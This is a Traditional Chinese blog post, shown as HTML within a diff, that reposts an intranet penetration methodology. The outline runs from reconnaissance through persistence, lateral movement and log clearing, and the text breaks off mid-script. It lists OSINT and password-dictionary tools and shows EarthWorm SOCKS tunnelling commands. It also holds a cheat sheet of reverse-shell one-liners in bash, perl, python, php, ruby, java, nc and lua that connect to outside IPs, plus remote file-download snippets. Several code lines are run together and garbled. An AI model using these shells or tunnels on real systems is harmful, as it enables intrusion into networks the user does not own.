@@ -1,0 +1,1679 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-TW, en">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="一介凡人做的，平凡的隨筆部落格..." />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>【內網滲透】整體思路及利用方法總結 |  Night Vestige</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <script src="https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js"></script>
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-【內網滲透】整體思路及利用方法總結"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  【內網滲透】整體思路及利用方法總結
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/09/22/%E3%80%90%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F%E3%80%91%E6%95%B4%E9%AB%94%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E7%B8%BD%E7%B5%90/" class="article-date">
+  <time datetime="2021-09-22T03:47:41.000Z" itemprop="datePublished">2021-09-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Cyber-Security/">Cyber Security</a> / <a class="article-category-link" href="/categories/Cyber-Security/Attack/">Attack</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">8.1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">39 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <blockquote>
+<p>此文章為黑白之道所著，由於該作者因為中國的政策關係而刪除此文章，故在下於此先行做備份，先說這是作者有聲明同意的，而原本的<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650521567&idx=3&sn=fa654903d47763ed1fd4f0b40d957018&chksm=83bada3bb4cd532d64c4de08f28bb8c8c6a2879a80b7a70af2da60c092157417388ad5220728#rd">文章連結</a>已經被作者刪除了TAT<br>但本文章有做一些語句與用語上的調整，以及內容的微調，但是主要內容都沒有做更動</p>
+</blockquote>
+<span id="more"></span>
+
+<p>一般針對內網的滲透過程中，整體的思路以及方法應該如下：</p>
+<ul>
+<li><strong>情資蒐集</strong>：<ul>
+<li>開源情報情資蒐集</li>
+<li>創建企業密碼字典</li>
+</ul>
+</li>
+<li><strong>進入內網</strong>：<ul>
+<li>基於企業弱帳號漏洞</li>
+<li>基於系統漏洞進入</li>
+<li>網站應用程式滲透</li>
+<li>隱匿攻擊<ul>
+<li>Command and Control</li>
+<li>VPN</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>內網跨邊界應用</strong>：<ul>
+<li>內網跨邊界轉發</li>
+<li>內網跨邊界代理穿透</li>
+<li>shell 反彈 … 等</li>
+</ul>
+</li>
+<li><strong>內網情資蒐集</strong>：<ul>
+<li>本機情資蒐集</li>
+<li>擴散情資蒐集</li>
+</ul>
+</li>
+<li><strong>權限提升</strong><ul>
+<li>Windows</li>
+<li>Linux</li>
+</ul>
+</li>
+<li><strong>權限維持</strong><ul>
+<li>系統後門</li>
+<li>Web 後門</li>
+</ul>
+</li>
+<li><strong>橫向移動</strong><ul>
+<li>埠滲透</li>
+<li>域滲透</li>
+</ul>
+</li>
+<li><strong>痕跡清除</strong><ul>
+<li>Windows 日誌清除</li>
+<li>破壞 Windows 日誌記錄功能 … 等<br>下面會一這樣的路線，依序來說明具體每一步該怎麼做。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="0x00-情資蒐集"><a href="#0x00-情資蒐集" class="headerlink" title="0x00 情資蒐集"></a><strong><u>0x00 情資蒐集</u></strong></h2><h3 id="開源情報情資蒐集-OSINT"><a href="#開源情報情資蒐集-OSINT" class="headerlink" title="開源情報情資蒐集 (OSINT)"></a><em>開源情報情資蒐集 (OSINT)</em></h3><h4 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/az0ne/Github_Nuggests">Github_Nuggests</a><blockquote>
+<p>自動爬取 Github 上文件敏感資訊洩漏</p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/FeeiCN/GSIL">GSIL</a><blockquote>
+<p>能夠實現近實時 (15 分鐘內) 的發現 Github 上洩漏的資訊</p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/MiSecurity/x-patrol">x-patrol</a><blockquote>
+<p>小米團隊的</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="whois-查詢-註冊人反查詢-信箱反查詢-相關資產"><a href="#whois-查詢-註冊人反查詢-信箱反查詢-相關資產" class="headerlink" title="whois 查詢 / 註冊人反查詢 / 信箱反查詢 / 相關資產"></a>whois 查詢 / 註冊人反查詢 / 信箱反查詢 / 相關資產</h4><ul>
+<li><a target="_blank" rel="noopener" href="http://whois.chinaz.coom/?DomainName=target.com&ws=">站長之家</a></li>
+<li><a target="_blank" rel="noopener" href="https://whois.aizhan.com/target.com/">愛站</a></li>
+<li><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">微步在線</a></li>
+<li><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">IP 反查</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.tianyancha.com/">天眼查</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.whomx.com/">虎媽查</a></li>
+<li>歷史漏洞查詢<ul>
+<li><a target="_blank" rel="noopener" href="http://wy.zoone.ci/">在線查詢</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/hanc00I/wooyun_publi/">自搭建</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h4><h3 id="創建企業密碼字典"><a href="#創建企業密碼字典" class="headerlink" title="創建企業密碼字典"></a><em>創建企業密碼字典</em></h3><h4 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/lavalamp-/password-lists">passwordlist</a></li>
+<li><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dFJyedzBlasting_dictionary">豬豬俠字典</a><blockquote>
+<p>分享和收集各種字典，包括弱密碼，針對特定的廠商，重點構造廠商相關域名的字典</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;%pwd%123&#x27;,&#x27;%user%123&#x27;,&#x27;%user%521&#x27;,&#x27;%user%2017&#x27;,&#x27;%pwd%321&#x27;,&#x27;%pwd%521&#x27;,&#x27;%user%321&#x27;,&#x27;%pwd%123!&#x27;,&#x27;%pwd%123!@#&#x27;,&#x27;%pwd%1234&#x27;,&#x27;%user%2016&#x27;,&#x27;%user%123$%^&#x27;,&#x27;%user%123!@#&#x27;,&#x27;%pwd%2016&#x27;,&#x27;%pwd%2017&#x27;,&#x27;%pwd%1!&#x27;,&#x27;%pwd%2@&#x27;,&#x27;%pwd%3#&#x27;,&#x27;%pwd%123#@!&#x27;,&#x27;%pwd%12345&#x27;,&#x27;%pwd%123$%^&#x27;,&#x27;%pwd%!@#456&#x27;,&#x27;%pwd%123qwe&#x27;,&#x27;%pwd%qwe123&#x27;,&#x27;%pwd%qwe&#x27;,&#x27;%pwd%123456&#x27;,&#x27;%user%123#@!&#x27;,&#x27;%user%!@#456&#x27;,&#x27;%user%1234&#x27;,&#x27;%user%12345&#x27;,&#x27;%user%123456&#x27;,&#x27;%user%123!&#x27;]</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+</ul>
+<h4 id="密碼生成"><a href="#密碼生成" class="headerlink" title="密碼生成"></a>密碼生成</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/RicterZ/genpAss/">GenpAss</a><blockquote>
+<p>中國特色的弱密碼生成器</p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bit4woo/passmaker">passmaker</a><blockquote>
+<p>可以自定義規則的密碼字典生成器</p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/LandGrey/pydictor">pydictor</a><blockquote>
+<p>強大的密碼生成器</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="信箱列表獲取"><a href="#信箱列表獲取" class="headerlink" title="信箱列表獲取"></a>信箱列表獲取</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">theHarvester</a><blockquote>
+<p>獲取一個信箱以後導出通訊錄</p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mdsecactivebreach/LinkedInt">LinkedInt</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Mailget">Mailget</a></li>
+</ul>
+<h4 id="洩漏密碼查詢"><a href="#洩漏密碼查詢" class="headerlink" title="洩漏密碼查詢"></a>洩漏密碼查詢</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://ghostproject.fr/">ghostproject</a></li>
+<li><a target="_blank" rel="noopener" href="https://pwndb2am4tzkvold.onion.to/">pwndb</a></li>
+</ul>
+<h4 id="對企業外部相關情資進行蒐集"><a href="#對企業外部相關情資進行蒐集" class="headerlink" title="對企業外部相關情資進行蒐集"></a>對企業外部相關情資進行蒐集</h4><h5 id="子域名獲取"><a href="#子域名獲取" class="headerlink" title="子域名獲取"></a>子域名獲取</h5><ul>
+<li>Layer 子域名挖掘機 4.2 紀念版</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ring04h/wydomain">wydomain</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></li>
+<li>使用 Google Hacking 語法 <code>site:target.com</code></li>
+<li>Github Repository</li>
+<li>抓包分析請求返回值 (跳轉 / 文件上傳 / app / api 接口 …)</li>
+<li>站長幫手 links 等在線查詢網站</li>
+<li>域傳送漏洞</li>
+<li>Linux  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @ns.example.com example=.com AXFR</span><br></pre></td></tr></table></figure></li>
+<li>Windows  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查詢解析某域名的 DNS 伺服器 nslookup</span></span><br><span class="line"><span class="comment"># 進入 nslookup 交互模式 server dns.domain.com</span></span><br><span class="line"><span class="comment"># 指定 dns 伺服器 ls xxx.yyy.cn</span></span><br><span class="line"><span class="comment"># 列出域資訊 GetDomainsBySSL.py: https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/</span></span><br><span class="line">nslookup <span class="literal">-type</span>=ns xxx.yyy.cn</span><br></pre></td></tr></table></figure></li>
+<li><a target="_blank" rel="noopener" href="https://censys.io/certificates?q=target.com">censys.io 證書</a></li>
+<li><a target="_blank" rel="noopener" href="https://crt.sh/?q=%25.target.com">crt.sh 證書查詢</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.shodan.io/">shodan</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">zoomeye</a></li>
+<li><a target="_blank" rel="noopener" href="https://fofa.so/">fofa</a></li>
+<li><a target="_blank" rel="noopener" href="https://censys.io/">censys</a></li>
+<li><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/search?q=target.com">dnsdb.io</a></li>
+<li><a target="_blank" rel="noopener" href="http://api.hackertarget.com/reversedns/?q=target.com">api.hackertarget.com</a></li>
+<li><a target="_blank" rel="noopener" href="https://community.riskiq.com/Search/target.com">community.riskiq.com</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/yanxiu0614/subdomain3">subdomain3</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Chora10/FuzzDomain">FuzzDomain</a></li>
+<li><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">dnsdumpster.com</a></li>
+<li><a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">phpinfo.me</a></li>
+<li><a target="_blank" rel="noopener" href="https://dns.bufferover.run/dns?q=baidu.com">dns 開放數據接口</a></li>
+</ul>
+<hr>
+<h2 id="0x01-進入內網"><a href="#0x01-進入內網" class="headerlink" title="0x01 進入內網"></a><strong><u>0x01 進入內網</u></strong></h2><h3 id="基於企業弱帳號漏洞"><a href="#基於企業弱帳號漏洞" class="headerlink" title="基於企業弱帳號漏洞"></a><em>基於企業弱帳號漏洞</em></h3><ul>
+<li>VPN (通過信箱、密碼爆破、社交工程等途徑獲取 VPN)</li>
+<li>企業相關維運系統 (zabbix 等)</li>
+</ul>
+<h3 id="基於系統漏洞進入"><a href="#基於系統漏洞進入" class="headerlink" title="基於系統漏洞進入"></a><em>基於系統漏洞進入</em></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">Metasploit</a><blockquote>
+<p>漏洞利用框架</p>
+</blockquote>
+</li>
+<li>漏洞利用腳本</li>
+</ul>
+<h3 id="網站應用程式滲透"><a href="#網站應用程式滲透" class="headerlink" title="網站應用程式滲透"></a><em>網站應用程式滲透</em></h3><ul>
+<li>SQL Injection)</li>
+<li>Cross-Site Scripting (XSS)</li>
+<li>Cross-Site Request Forgery (CSRF)</li>
+<li>Server-Side Request Forgery (SSRF / ssrf_proxy)</li>
+<li>功能 / 業務邏輯漏洞</li>
+<li>其他漏洞</li>
+<li>CMS-內容管理系統漏洞</li>
+<li>企業自建代理</li>
+</ul>
+<h4 id="無線-Wi-Fi-接入"><a href="#無線-Wi-Fi-接入" class="headerlink" title="無線 Wi-Fi 接入"></a><em>無線 Wi-Fi 接入</em></h4><h3 id="隱匿攻擊"><a href="#隱匿攻擊" class="headerlink" title="隱匿攻擊"></a><em>隱匿攻擊</em></h3><h4 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/">ICMP</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/06/command-and-control-dns/">DNS</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/">DropBox</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/">Gmail</a></li>
+<li><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-16142.html">Telegram</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/">Website Keyword</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/08/19/command-and-control-powershell/">PowerShell</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/01/command-and-control-windows-com/">Windows COM</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/">WebDAV</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86974">Office 365</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/10/04/command-and-control-https/">HTTPS</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/10/02/command-and-control-kernel/">Kernel</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/11/14/command-and-control-website/">Website</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/">WMI</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/">WebSocket</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/01/02/command-and-control-images/">Images</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/">Web Interface</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/">JavaScript</a><br>… etc.</li>
+</ul>
+<h4 id="Fronting"><a href="#Fronting" class="headerlink" title="Fronting"></a>Fronting</h4><ul>
+<li>Domain Fronting</li>
+<li>Tor Fronting</li>
+</ul>
+<h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><ul>
+<li>VPN</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/shadowsocks/">shadowsocks</a></li>
+<li><a target="_blank" rel="noopener" href="http://cn-proxy.com/">中國代理服務器</a></li>
+<li>Tor</li>
+</ul>
+<hr>
+<h2 id="0x02-內網跨邊界應用"><a href="#0x02-內網跨邊界應用" class="headerlink" title="0x02 內網跨邊界應用"></a><strong><u>0x02 內網跨邊界應用</u></strong></h2><h3 id="內網跨邊界轉發"><a href="#內網跨邊界轉發" class="headerlink" title="內網跨邊界轉發"></a><em>內網跨邊界轉發</em></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/l_f0rm4t3d/article/details/24004555">NC 埠轉發</a></li>
+<li><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-53401-id-4407931.html">LCX 埠轉發</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cnlh/nps">nps</a><blockquote>
+<p>個人用覺得比較穩定</p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna">代理腳本 Tunna</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sensepost/reDuh">reDuh</a><br>… etc.</li>
+</ul>
+<h3 id="內網跨邊界代理穿透"><a href="#內網跨邊界代理穿透" class="headerlink" title="內網跨邊界代理穿透"></a><em>內網跨邊界代理穿透</em></h3><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://rootkiter.com/EarthWorm/">https://rootkiter.com/EarthWorm/</a></p>
+</blockquote>
+<ul>
+<li>正向 SOCKS v5 伺服器  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure></li>
+<li>反彈 SOCKS v5 服務器：<ol>
+<li>先在一台具有外網 IP 的主機 A 上運行下列命令 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure></li>
+<li>在目標主機 B 上啟動 SOCKS v5 服務，並反彈到外網主機的 8888 埠 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d 1.1.1.1 -e 8888</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>多級級聯  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br></pre></td></tr></table></figure></li>
+<li><code>lcx_tran</code> 的用法  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure></li>
+<li><code>lcx_listen</code>、<code>lcx_slave</code> 的用法  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure></li>
+<li>「三級級聯」的本地 SOCKS 測試用例以供參考  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 9999 -e 7777</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="Termite-跳板機"><a href="#Termite-跳板機" class="headerlink" title="Termite (跳板機)"></a>Termite (跳板機)</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://rootkiter.com/Termite/">https://rootkiter.com/Termite/</a><br><a target="_blank" rel="noopener" href="https://rootkiter.com/Termite/README.txt">使用說明</a></p>
+</blockquote>
+<h4 id="代理腳本"><a href="#代理腳本" class="headerlink" title="代理腳本"></a>代理腳本</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">reGeorg</a></li>
+</ul>
+<h4 id="shell-反彈"><a href="#shell-反彈" class="headerlink" title="shell 反彈"></a>shell 反彈</h4><ul>
+<li>bash  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1perl</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span>python</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span>php</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span>ruby</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span>java</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])p.waitFor()nc</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用 -e</span></span><br><span class="line">nc -e /bin/sh 223.8.200.234 1234</span><br><span class="line"></span><br><span class="line"><span class="comment">#不使用 -e</span></span><br><span class="line">mknod /tmp/backpipe p/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipelua</span><br></pre></td></tr></table></figure>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;202.103.243.122&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="內網文件的傳輸和下載"><a href="#內網文件的傳輸和下載" class="headerlink" title="內網文件的傳輸和下載"></a>內網文件的傳輸和下載</h4><ul>
+<li><code>wput</code>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wput dir_name ftp://linuxpig:123456@host.com/</span><br></pre></td></tr></table></figure></li>
+<li><code>wget</code>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://site.com/1.rar -O 1.rar</span><br></pre></td></tr></table></figure></li>
+<li><code>ariac2</code> (需安裝)  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</span><br></pre></td></tr></table></figure></li>
+<li>powershell  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient <span class="variable">$p</span>.DownloadFile(<span class="string">&quot;http://domain/file&quot;</span>,<span class="string">&quot;C:%homepath%file&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+<li>vbs 腳本  <figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">&quot;http://domain/file&quot;</span></span><br><span class="line"><span class="keyword">dim</span> xHttp: <span class="keyword">Set</span> xHttp = <span class="built_in">createobject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">dim</span> bStrm: <span class="keyword">Set</span> bStrm = <span class="built_in">createobject</span>(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">xHttp.Open <span class="string">&quot;GET&quot;</span>, Url, FalsexHttp.Sendwith bStrm.type = <span class="number">1</span> <span 